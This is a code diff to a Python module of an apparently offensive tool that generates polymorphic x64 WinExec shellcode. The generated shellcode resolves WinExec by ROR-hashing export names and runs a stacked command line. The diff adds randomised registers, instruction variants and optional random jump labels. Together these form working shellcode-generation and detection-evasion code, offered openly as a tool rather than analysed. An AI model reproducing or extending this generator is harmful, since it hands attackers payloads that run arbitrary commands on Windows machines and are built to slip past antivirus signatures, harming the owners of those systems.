@@ -23,11 +23,12 @@ def register_arguments(parser):
     parser.add_argument('-o', '--output', required=True, help='Output file')
     opt = parser.add_argument_group('additional')
     opt.add_argument('-d', '--debug', action='store_true', default=False, help='Save nasm code only')
+    #opt.add_argument('-n', '--no-comment', action='store_true', default=False, help='No comments in nasm file')
+    opt.add_argument('-r', '--random-label', action='store_true', default=False, help='Replace jump labels with random words')
 
 class module:
     Author = 'psycore8'
-    #Description = 'Generate a dynamic WinExec shellcode'
-    Version = '0.1.0'
+    Version = '0.1.2'
     DisplayName = 'WinEXEC'
     opcode = ''
     size = 0
@@ -35,10 +36,11 @@ class module:
     relay_input = False
     relay_output = False
 
-    def __init__(self, command_line, debug, output):
+    def __init__(self, command_line, debug, output, random_label):
         self.command_line = command_line
         self.debug = debug
         self.output = output
+        self.random_label = random_label
 
     def msg(self, message_type, MsgVar=str, ErrorExit=False):
         messages = {
@@ -101,10 +103,11 @@ class module:
             return False
 
     def generate_shellcode(self):
-        vi = variable_instruction_set()
+        vi = variable_instruction_set(16)
         fh = FunctionHash()
         
         # randomize instructions
+        # r9 variable is used as jump register
         rax, rbx, rcx, rdx, r8, r9, rsi, rdi, r10, r11 = vi.random.sample(vi.multi_bit_registers, 10)
         rc = vi.random.choice
 
@@ -116,12 +119,20 @@ class module:
         else:
             winexec_hash = fh.ror_hash('WinExec', shift_bits)
 
-        lb_findFuncPos = vi.generate_jump_label()
-        lb_HashLoop = vi.generate_jump_label()
-        lb_HashCompare = vi.generate_jump_label()
-        lb_WinExecFound = vi.generate_jump_label()
-        lb_InvokeWinExec = vi.generate_jump_label()
-        lb_exit = vi.generate_jump_label()
+        if self.random_label:
+            lb_findFuncPos, lb_HashLoop, lb_HashCompare, lb_WinExecFound, lb_InvokeWinExec, lb_exit = vi.generate_jump_label()
+        else:
+            lb_findFuncPos = 'findFuncPos'
+            lb_exit = 'exit'
+            lb_HashCompare = 'HashCompare'
+            lb_HashLoop = 'HashLoop'
+            lb_InvokeWinExec = 'InvokeWinExec'
+            lb_WinExecFound = 'WinExecFound'
+        # lb_HashLoop         = vi.generate_jump_label()
+        # lb_HashCompare      = vi.generate_jump_label()
+        # lb_WinExecFound     = vi.generate_jump_label()
+        # lb_InvokeWinExec    = vi.generate_jump_label()
+        # lb_exit             = vi.generate_jump_label()
 
         # prepare command string for the stack
         stacked_command_list = []
@@ -140,7 +151,7 @@ class module:
                 push rbp
                 mov rbp, rsp
                 sub rsp, 40h
-                {rc(vi.register_set_zero)} {rax[0]}, {rax[0]}
+                {vi.zero_register(rax[0])}
 
                 ; ### reserve memory for local variables ###
                 ; 08h: Number of functions
@@ -181,7 +192,7 @@ class module:
                 ; RVA Export Table          -> rax
                 ; RVA Export Table + base   = VA Export Table
 
-                {rc(vi.register_set_zero)} {rcx[0]}, {rcx[0]}
+                {vi.zero_register(rcx[0])}
                 mov {rax[1]}, [{rbx[0]} + 0x3c] 
                 add {rax[0]}, {rbx[0]} 
                 mov {rcx[3]}, 88h 
@@ -209,22 +220,22 @@ class module:
                 add {rcx[0]}, {rbx[0]}    
                 mov [rbp - 20h], {rcx[0]}  
 
-                {rc(vi.register_set_zero)} {rax[0]}, {rax[0]}
-                {rc(vi.register_set_zero)} {rcx[0]}, {rcx[0]}
+                {vi.zero_register(rax[0])}
+                {vi.zero_register(rcx[0])}
                 mov {rcx[1]}, [rbp - 8h]    
                 mov {rsi[0]}, [rbp - 18h]          
 
             {lb_findFuncPos}:
-                {rc(vi.register_set_zero)} {r8[0]}, {r8[0]}   
+                {vi.zero_register(r8[0])}  
                 mov {rax[1]}, [rbp - 8h]
                 sub {rax[1]}, {rcx[1]}
                 mov {rdi[1]}, [{rsi[0]}]
                 add {rdi[0]}, {rbx[0]}
 
             {lb_HashLoop}:
-                {rc(vi.register_set_zero)} {rdx[0]}, {rdx[0]}
+                {vi.zero_register(rdx[0])}
                 mov {rdx[3]}, [{rdi[0]}]
-                test {rdx[3]}, {rdx[3]}
+                {rc(vi.test_condition)} {rdx[3]}, {rdx[3]}
                 {rc(vi.jump_conditional_positive)} {lb_HashCompare}
                 {hash_algorithm} {r8[1]}, {shift_bits}       
                 add {r8[1]}, {rdx[1]}
@@ -235,7 +246,7 @@ class module:
                 cmp {r8[1]}, {hex(winexec_hash)}   
                 {rc(vi.jump_conditional_positive)} {lb_WinExecFound}
                 
-                add {rsi[0]}, 4                ; {vi.increase_register(rsi[0], 4)}
+                add {rsi[0]}, 4                
                 {vi.decrease_register(rcx[0])}
                 cmp {rcx[0]}, 0
                 {rc(vi.jump_conditional_negative)} {lb_findFuncPos}
@@ -256,8 +267,6 @@ class module:
                 mov rax, {rax[0]}
 
             {lb_InvokeWinExec}:
-                xor rdx, rdx
-                xor rcx, rcx  
                 push rcx 
                 ; begin stacked_command
                 {stacked_command}
